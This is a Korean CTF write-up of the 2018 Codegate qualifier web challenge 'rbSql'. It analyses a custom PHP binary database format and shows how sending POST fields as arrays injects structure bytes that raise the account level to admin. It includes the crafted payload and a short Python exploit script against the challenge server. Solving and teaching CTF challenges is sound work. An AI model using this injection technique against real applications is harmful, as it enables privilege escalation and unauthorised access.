# [2018_Codegate_Prequal] \[Web] rbSql

## Key words

* Custom DB/SQL

## Solution

Custom SQL을 사용합니다. 

```php
function rbParse($rawData){
	$parsed = array();
	$idx = 0;
	$pointer = 0;

	while(strlen($rawData)>$pointer){
		if($rawData[$pointer] == STR){
			$pointer++;
			$length = ord($rawData[$pointer]);
			$pointer++;
			$parsed[$idx] = substr($rawData,$pointer,$length);
			$pointer += $length;
		}
		elseif($rawData[$pointer] == ARR){
			$pointer++;
			$arrayCount = ord($rawData[$pointer]);
			$pointer++;
			for($i=0;$i<$arrayCount;$i++){
				if(substr($rawData,$pointer,1) == ARR){
					$pointer++;
					$arrayCount2 = ord($rawData[$pointer]);
					$pointer++;
					for($j=0;$j<$arrayCount2;$j++){
						$pointer++;
						$length = ord($rawData[$pointer]);
						$pointer++;
						$parsed[$idx][$i][$j] = substr($rawData,$pointer,$length);
						$pointer += $length;
					}
				}
				else{
					$pointer++;
					$length = ord(substr($rawData,$pointer,1));
					$pointer++;
					$parsed[$idx][$i] = substr($rawData,$pointer,$length);
					$pointer += $length;
				}
			}
		}
		$idx++;
		if($idx > 2048) break;
	}
	return $parsed[0];
}
```

DB의 구조를 분석해야 합니다. 위의 파싱 함수를 분석하여 구조를 알아낼 수 있었습니다. 구조체의 첫 바이트가 1이면 문자열, 2이면 Array로 판단합니다. 두번째 바이트는 문자열의 길이 또는 array의 크기를 의미합니다. 그 뒤에는 데이터가 옵니다.

```
00000000: 0210 010b 7262 5371 6c53 6368 656d 6101  ....rbSqlSchema.
00000010: 0c2f 7262 5371 6c53 6368 656d 6102 0201  ./rbSqlSchema...
00000020: 0a6d 656d 6265 725f 6131 3201 222e 2e2f  .member_a12."../
00000030: 2e2e 2f72 6253 716c 2f72 6253 716c 5f61  ../rbSql/rbSql_a
00000040: 3830 6431 6135 6335 6633 3364 3962 6202  80d1a5c5f33d9bb.
00000050: 0201 0d6d 656d 6265 725f 7165 7431 3235  ...member_qet125
00000060: 0126 2e2e 2f2e 2e2f 7262 5371 6c2f 7262  .&../../rbSql/rb
00000070: 5371 6c5f 3131 3131 6237 3062 6166 3338  Sql_1111b70baf38
00000080: 3135 6537 6462 6639 0202 010a 6d65 6d62  15e7dbf9....memb
00000090: 6572 5f61 3132 0126 2e2e 2f2e 2e2f 7262  er_a12.&../../rb
```

위는 `rbSql` 파일 중 일부입니다. 앞서 설명했던 구조를 확인할 수 있습니다.

```
/*
Table[
  tablename, filepath
  [column],
  [row],
  [row],
  ...
rbSqlSchema[
  rbSqlSchema,/rbSqlSchema,
  ["tableName","filePath"],
  ["something","/rbSql_".substr(md5(rand(10000000,100000000)),0,16)]
]
*/
```

PHP 파일의 맨 위를 보면 테이블과 스키마의 구조가 주석으로 설명되어 있습니다.(하나씩 해보면서 분석 다 하고 이걸 봤다능..)

```php
    include "dbconn.php";
    $ret = rbSql("select","member_".$_SESSION['uid'],["id",$_SESSION['uid']]);
    echo "<p>mail : {$ret['1']}</p><p>ip : {$ret['3']}</p>";
    if($_SESSION['lvl'] === "2"){
      echo "<p>Flag : </p>";
      include "/flag";
      rbSql("delete","member_".$_SESSION['uid'],["id",$_SESSION['uid']]);
    }
```

유저의 레벨이 2이면 flag가 출력됩니다. 테이블의 구조를 확인해보겠습니다.

```php
$ret = rbSql("create","member_".$uid,["id","mail","pw","ip","lvl"]);
```

`id, mail, pw, ip, lvl` 순으로 데이터가 들어갑니다.

```
00000000: 0204 010b 6d65 6d62 6572 5f61 6161 3701  ....member_aaa7.
00000010: 222e 2e2f 2e2e 2f72 6253 716c 2f72 6253  "../../rbSql/rbS
00000020: 716c 5f34 3630 3738 3639 6566 3438 6135  ql_4607869ef48a5
00000030: 6462 3102 0501 0269 6401 046d 6169 6c01  db1....id..mail.
00000040: 0270 7701 0269 7001 036c 766c 0205 0104  .pw..ip..lvl....
00000050: 6161 6137 0202 0109 0101 6101 0162 0101  aaa7......a..b..
00000060: 6301 2039 6466 3632 6536 3933 3938 3865  c. 9df62e693988e
00000070: 6234 6531 6531 3434 3465 6365 3035 3738  b4e1e1444ece0578
00000080: 3537 3901 0f31 3932 2e31 3638 2e31 3234  579..192.168.124
00000090: 2e31 3339 0101 31                        .139..1
```

실제 계정이 저장된 DB 내용은 위와 같습니다.

결국은 레벨을 2로 바꿔야 하는게 핵심인데 버그는 join 부분에서 발생합니다.

```php
  elseif($page == "join_chk"){
    $uid = $_POST['uid'];
    $umail = $_POST['umail'];
    $upw = $_POST['upw'];
    if(($uid) && ($upw) && ($umail)){
      if(strlen($uid) < 3) error("id too short");
      if(strlen($uid) > 16) error("id too long");
      if(!ctype_alnum($uid)) error("id must be alnum!");
      if(strlen($umail) > 256) error("email too long");
      include "dbconn.php";
      $upw = md5($upw);
      $uip = $_SERVER['REMOTE_ADDR'];
      if(rbGetPath("member_".$uid)) error("id already existed");
      echo "create : ";
      echo bin2hex(rbPack([$uid,$umail,$upw,$uip,"1"]));
      echo "\n";
      $ret = rbSql("create","member_".$uid,["id","mail","pw","ip","lvl"]);
      if(is_string($ret)) error("error");
      $ret = rbSql("insert","member_".$uid,[$uid,$umail,$upw,$uip,"1"]);
      if(is_string($ret)) error("error");
      exit("<script>location.href='./?page=login';</script>");
    }
    else error("join fail");
  }
```

POST 값을 array로 인식시키면 버그가 발생하여 데이터베이스에 담기는 내용을 twist 시킬 수 있습니다.

```
data = {
	"uid" : "aaa10",
	"umail[0]" : "\x01\x209df62e693988eb4e1e1444ece0578579\x01\x01a\x01\x012",
	"umail[3]" : "bbb",
	"upw" : "ccc",
	}
```

POST 데이터를 이런식으로 보내면 아래처럼 데이터가 꼬여서 들어가게 됩니다.

```
00000000: 0204 010c 6d65 6d62 6572 5f61 6161 3130  ....member_aaa10
00000010: 0122 2e2e 2f2e 2e2f 7262 5371 6c2f 7262  ."../../rbSql/rb
00000020: 5371 6c5f 3734 6166 6630 6135 6232 3132  Sql_74aff0a5b212
00000030: 3561 3565 0205 0102 6964 0104 6d61 696c  5a5e....id..mail
00000040: 0102 7077 0102 6970 0103 6c76 6c02 0501  ..pw..ip..lvl...
00000050: 0561 6161 3130 0202 0128 0120 3964 6636  .aaa10...(. 9df6
00000060: 3265 3639 3339 3838 6562 3465 3165 3134  2e693988eb4e1e14
00000070: 3434 6563 6530 3537 3835 3739 0101 6101  44ece0578579..a.
00000080: 0132 0120 3964 6636 3265 3639 3339 3838  .2. 9df62e693988
00000090: 6562 3465 3165 3134 3434 6563 6530 3537  eb4e1e1444ece057
000000a0: 3835 3739 010f 3139 322e 3136 382e 3132  8579..192.168.12
000000b0: 342e 3133 3901 0131                      4.139..1
```

```
    [3] => Array
        (
            [0] => aaa10
            [1] => (
            [2] => 9df62e693988eb4e1e1444ece0578579
            [3] => a
            [4] => 2
        )
```

그래서 실제 파싱하면서 lvl을 2로 인식하게 됩니다.

```
import requests

url = "http://52.78.188.150/rbsql_4f6b17dc3d565ce63ef3c4ff9eef93ad/?page=join_chk"
#url  = "http://192.168.124.139/rbSql/tmp/?page=join_chk"
data = {
	"uid" : "aaa10",
	"umail[0]" : "\x01\x209df62e693988eb4e1e1444ece0578579\x01\x01a\x01\x012",
	"umail[3]" : "bbb",
	"upw" : "ccc",
	}
r = requests.post(url, data=data)
print r.status_code
response = r.text

print response
```

위 코드로 가입을 하여 로그인 해보면 아래와 같이 flag를 확인할 수 있습니다.

```
uid : aaa10
level : Admin
mail : (
ip : a
Flag :
FLAG{akaneTsunemoriIsSoCuteDontYouThinkSo?}
```

